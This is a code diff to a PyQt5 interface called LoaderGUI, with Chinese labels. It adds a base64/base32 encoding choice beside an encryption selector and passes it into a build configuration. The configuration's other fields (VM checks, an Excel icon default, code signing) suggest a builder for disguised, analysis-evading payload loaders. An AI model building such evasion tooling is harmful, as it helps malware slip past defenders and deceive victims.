@@ -6,7 +6,7 @@ import os
 from PyQt5.QtCore import QSize
 from PyQt5.QtWidgets import (
     QWidget, QPushButton, QTextEdit, QLineEdit,
-    QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox
+    QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox, QComboBox
 )
 from PyQt5.QtGui import QIcon, QMovie
 
@@ -100,7 +100,11 @@ class LoaderGUI(QWidget):
         enc_group = QGroupBox('加密方式')
         enc_layout = QHBoxLayout()
         self.enc_box = create_encryption_combobox()
-        enc_layout.addWidget(self.enc_box)
+        self.encode_box = QComboBox()
+        self.encode_box.addItems(['base64', 'base32', 'none'])
+        self.encode_box.setCurrentText('base64')  # 默认base64
+        enc_layout.addWidget(self.enc_box, 8)
+        enc_layout.addWidget(self.encode_box, 2)
         enc_group.setLayout(enc_layout)
         return enc_group
     
@@ -265,6 +269,8 @@ class LoaderGUI(QWidget):
         
         enc_method = self.enc_box.itemData(self.enc_box.currentIndex()) or self.enc_box.currentText()
         
+        encode_method = self.encode_box.currentText()
+        
         icon_path = self.ico_box.itemData(self.ico_box.currentIndex())
         if not icon_path:
             icon_path = os.path.join('icons', 'excel.ico')
@@ -290,6 +296,7 @@ class LoaderGUI(QWidget):
             'run_mode': run_mode,
             'vm_checks': vm_checks,
             'enc_method': enc_method,
+            'encode_method': encode_method,
             'icon_path': icon_path,
             'sign_enable': sign_enable,
             'sign_app': sign_app,
